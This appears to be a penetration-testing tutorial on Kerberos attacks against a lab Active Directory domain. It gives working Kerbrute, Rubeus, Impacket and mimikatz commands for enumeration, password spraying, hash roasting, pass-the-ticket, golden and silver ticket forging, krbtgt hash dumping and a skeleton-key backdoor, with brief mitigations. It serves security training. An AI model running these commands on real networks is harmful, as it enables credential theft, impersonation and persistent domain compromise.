# Attacking Kerberos

## Attack Privilege Requirements

* Kerbrute Enumeration - No domain access required&#x20;
* Pass the Ticket - Access as a user to the domain required
* Kerberoasting - Access as any user required
* AS-REP Roasting - Access as any user required
* Golden Ticket - Full domain compromise (domain admin) required&#x20;
* Silver Ticket - Service hash required&#x20;
* Skeleton Key - Full domain compromise (domain admin) required

## Enumeration w/ Kerbrute

Brute force user accounts from a domain controller using a supplied wordlist:

```bash
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

## Harvesting & Brute-Forcing Tickets w/ Rubeus

Harvest for TGTs every 30 seconds:

```powershell
Rubeus.exe harvest /interval:30
```

## Brute-Forcing / Password-Spraying w/ Rubeus

{% hint style="info" %}
Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file
{% endhint %}

```powershell
Rubeus.exe brute /password:Password1 /noticket
```

This returns .kirbi ticket (TGT)

{% hint style="warning" %}
Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.
{% endhint %}

## Kerberoasting w/ Rubeus & Impacket

### Rubeus

Dump the Kerberos hash of any kerberoastable users:

```powershell
Rubeus.exe kerberoast
```

Now you can take the hash of the service and crack it (Hashcat mode 13100 for TGS-REP)

### Impacket

Dump the hash:

```bash
impacket-GetUserSPNs controller.local/Machine1:Password1 -dc-ip 10.10.2.205 -request
```

### What can a Service Account do?

After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not.&#x20;

If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit.&#x20;

If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users.

### Kerberoasting Mitigation

* &#x20;Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
* &#x20;Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.

## AS-REP Roasting w/ Rubeus

Look for vulnerable users and then dump found vulnerable user hashes:

```powershell
Rubeus.exe asreproast
```

Next, crack it with tools such as hashcat

### AS-REP Roasting Mitigations

* Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
* Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.

## Pass the Ticket w/ mimikatz

### Prepare Mimikatz & Dump Tickets

Run mimikatz:

```powershell
mimikatz.exe
```

Check privilege:

```powershell
privilege::debug
```

{% hint style="warning" %}
Ensure above command outputs \[output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
{% endhint %}

Export all of the .kirbi tickets into the directory that you are currently in:

```powershell
sekurlsa::tickets /export
```

### Pass the Ticket

Run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket:

```powershell
kerberos::ptt <ticket>
```

Now, go to **CMD or PowerShell**;

Verifying that we successfully impersonated the ticket by listing our cached tickets:

```powershell
klist
```

Now, you can look at the admin share to verify it one more time:

```powershell
dir \\controller.local\admin$
```

### Pass the Ticket Mitigation

* Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.

## Golden/Silver Ticket Attacks w/ mimikatz

### Dump the krbtgt hash

Run mimikatz:

```powershell
mimikatz.exe
```

Check privilege:

```powershell
privilege::debug
```

Dump the hash as well as the security identifier (SID) needed to create a **Golden Ticket**.&#x20;

```powershell
lsadump::lsa /inject /name:krbtgt
```

{% hint style="info" %}
To create a **silver ticket** you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
{% endhint %}

### Create a Golden/Silver Ticket

Create a golden ticket:

```powershell
Kerberos::golden /user:Administrator /domain:controller.local /sid:[SID] /krbtgt:[ntlm hash of krbgtg] /id:[userID]
```

{% hint style="info" %}
To create a **silver ticket** simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103
{% endhint %}

### Use the Golden/Silver Ticket to access other machines

Open a new elevated command prompt with the given ticket in mimikatz:

```powershell
misc::cmd
```

{% hint style="info" %}
Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from, however, if you took the ticket from krbtgt you have access to the **ENTIRE** network hence the name **Golden Ticket**; however, **Silver Tickets** only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
{% endhint %}

To test it, again look at shares of other users

## Kerberos Backdoors w/ mimikatz

Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.&#x20;

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption.&#x20;

The default hash for a mimikatz skeleton key is _60BA4FCADC466C7A033C178194C03DF6_ which makes the password -"_mimikatz_"

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

### Installing the Skeleton Key w/ mimikatz

```powershell
misc::skeleton
```

### Accessing the forest

The default credentials will be: "_mimikatz_"

The share will now be accessible without the need for the Administrators password

```powershell
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
```

Access the directory of Desktop-1 without ever knowing what users have access to Desktop-1:

```powershell
dir \\Desktop-1\c$ /user:Machine1 mimikatz
```

{% hint style="warning" %}
The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques
{% endhint %}
